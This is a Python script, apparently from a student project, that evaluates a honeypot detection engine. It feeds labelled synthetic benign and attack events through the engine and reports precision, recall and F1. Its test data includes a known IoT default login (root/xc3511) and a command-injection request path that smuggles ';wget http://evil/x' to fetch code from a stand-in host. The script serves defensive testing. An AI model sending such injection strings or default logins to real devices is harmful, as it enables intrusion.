#!/usr/bin/env python3
"""Quantitative evaluation of the detection engine.

Builds a *labelled* stream of events — benign traffic interleaved with four
attack scenarios whose ground-truth categories are known — feeds it through
the engine, and computes per-category precision / recall / F1 plus overall
accuracy.  Used to produce the numbers in the graduation report and as a
regression guard.

Run:  PYTHONPATH=src python3 scripts/evaluate.py
"""

from __future__ import annotations

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from honeynet.config import DetectionConfig  # noqa: E402
from honeynet.detection.engine import DetectionEngine  # noqa: E402
from honeynet.models import Event, EventType  # noqa: E402

BASE = datetime(2024, 1, 1, tzinfo=timezone.utc)


def ts(sec: float) -> str:
    return (BASE + timedelta(seconds=sec)).isoformat()


def build_labelled_stream() -> list[tuple[Event, set[str]]]:
    """Return (event, expected_categories_after_this_event) pairs."""
    stream: list[tuple[Event, set[str]]] = []
    t = 0.0

    # --- Benign browsing from a legitimate resident (no alerts) ---
    for i in range(20):
        stream.append((Event(source_ip="192.168.1.50", honeypot="http",
                             event_type=EventType.HTTP_REQUEST, http_path="/",
                             timestamp=ts(t)), set()))
        t += 3.0  # slow, human-paced

    # --- Benign successful login with a strong password (no alert) ---
    stream.append((Event(source_ip="192.168.1.51", honeypot="telnet",
                         event_type=EventType.LOGIN_ATTEMPT, username="owner",
                         password="Str0ng!Pass#42", success=True,
                         timestamp=ts(t)), set()))
    t += 5

    # --- Attack 1: default credentials (immediate signature hit) ---
    stream.append((Event(source_ip="203.0.113.9", honeypot="telnet",
                         event_type=EventType.LOGIN_ATTEMPT, username="root",
                         password="xc3511", success=True, timestamp=ts(t)),
                   {"default-credentials"}))
    t += 5

    # --- Attack 2: brute force burst (10 failed logins in ~5s) ---
    for i in range(10):
        expected = {"brute-force"} if i >= 4 else set()
        stream.append((Event(source_ip="203.0.113.10", honeypot="telnet",
                             event_type=EventType.LOGIN_ATTEMPT, username="admin",
                             password=f"try{i}", success=False, timestamp=ts(t)),
                       expected))
        t += 0.4

    # --- Attack 3: HTTP DoS flood (60 requests in ~6s) ---
    for i in range(60):
        expected = {"denial-of-service"} if i >= 49 else set()
        stream.append((Event(source_ip="203.0.113.11", honeypot="http",
                             event_type=EventType.HTTP_REQUEST, http_path="/",
                             timestamp=ts(t)), expected))
        t += 0.1

    # --- Attack 4: web exploitation probe (signature) ---
    stream.append((Event(source_ip="203.0.113.12", honeypot="http",
                         event_type=EventType.HTTP_REQUEST,
                         http_path="/boaform/admin/formLogin", timestamp=ts(t)),
                   {"active-scanning"}))
    t += 2
    # A pure command-injection payload (path chosen to NOT also match the
    # web-scanning signatures, so the ground-truth label is unambiguous).
    stream.append((Event(source_ip="203.0.113.13", honeypot="http",
                         event_type=EventType.HTTP_REQUEST,
                         http_path="/api/device?action=run&cmd=;wget http://evil/x",
                         timestamp=ts(t)), {"command-injection"}))
    return stream


def evaluate() -> dict:
    """Source-level evaluation.

    Each distinct source IP has a ground-truth set of attack categories
    (empty for benign sources).  We run the whole stream through the engine,
    collect the categories it alerted on per source, and compute
    precision/recall/F1 per category by comparing detected-vs-truth sources.
    Source-level (not event-level) accounting is the right granularity: the
    rate rules intentionally fire once per campaign, not once per packet.
    """
    cfg = DetectionConfig(brute_force_threshold=5, brute_force_window=60,
                          dos_threshold=50, dos_window=10, alert_cooldown=0)
    engine = DetectionEngine(cfg)
    stream = build_labelled_stream()

    categories = ["default-credentials", "brute-force", "denial-of-service",
                  "active-scanning", "command-injection"]

    truth_by_source: dict[str, set[str]] = {}
    detected_by_source: dict[str, set[str]] = {}
    for event, expected in stream:
        truth_by_source.setdefault(event.source_ip, set()).update(expected)
        detected_by_source.setdefault(event.source_ip, set())
        for alert in engine.process(event):
            detected_by_source[event.source_ip].add(alert.category)

    per_cat: dict[str, dict] = {}
    total_tp = total_fp = total_fn = 0
    for c in categories:
        srcs_truth = {s for s, cs in truth_by_source.items() if c in cs}
        srcs_det = {s for s, cs in detected_by_source.items() if c in cs}
        ctp = len(srcs_truth & srcs_det)
        cfp = len(srcs_det - srcs_truth)
        cfn = len(srcs_truth - srcs_det)
        prec = ctp / (ctp + cfp) if (ctp + cfp) else 1.0
        rec = ctp / (ctp + cfn) if (ctp + cfn) else 1.0
        f1 = 2 * prec * rec / (prec + rec) if (prec + rec) else 0.0
        per_cat[c] = {"tp": ctp, "fp": cfp, "fn": cfn,
                      "precision": round(prec, 3), "recall": round(rec, 3),
                      "f1": round(f1, 3)}
        total_tp += ctp
        total_fp += cfp
        total_fn += cfn

    benign_sources = {s for s, cs in truth_by_source.items() if not cs}
    benign_fp = len({s for s in benign_sources if detected_by_source.get(s)})

    micro_prec = total_tp / (total_tp + total_fp) if (total_tp + total_fp) else 1.0
    micro_rec = total_tp / (total_tp + total_fn) if (total_tp + total_fn) else 1.0
    micro_f1 = 2 * micro_prec * micro_rec / (micro_prec + micro_rec) if (micro_prec + micro_rec) else 0.0

    return {
        "per_category": per_cat,
        "benign_sources": len(benign_sources),
        "benign_false_positive_sources": benign_fp,
        "micro_precision": round(micro_prec, 3),
        "micro_recall": round(micro_rec, 3),
        "micro_f1": round(micro_f1, 3),
        "events": len(stream),
    }


def main() -> int:
    r = evaluate()
    print(f"Events evaluated        : {r['events']}")
    print(f"Benign sources          : {r['benign_sources']} "
          f"(false positives: {r['benign_false_positive_sources']})")
    print()
    print(f"{'Category':22} {'TP':>3} {'FP':>3} {'FN':>3} "
          f"{'Prec':>6} {'Rec':>6} {'F1':>6}")
    print("-" * 56)
    for c, m in r["per_category"].items():
        print(f"{c:22} {m['tp']:>3} {m['fp']:>3} {m['fn']:>3} "
              f"{m['precision']:>6} {m['recall']:>6} {m['f1']:>6}")
    print("-" * 56)
    print(f"{'MICRO AVERAGE':22} {'':>3} {'':>3} {'':>3} "
          f"{r['micro_precision']:>6} {r['micro_recall']:>6} {r['micro_f1']:>6}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
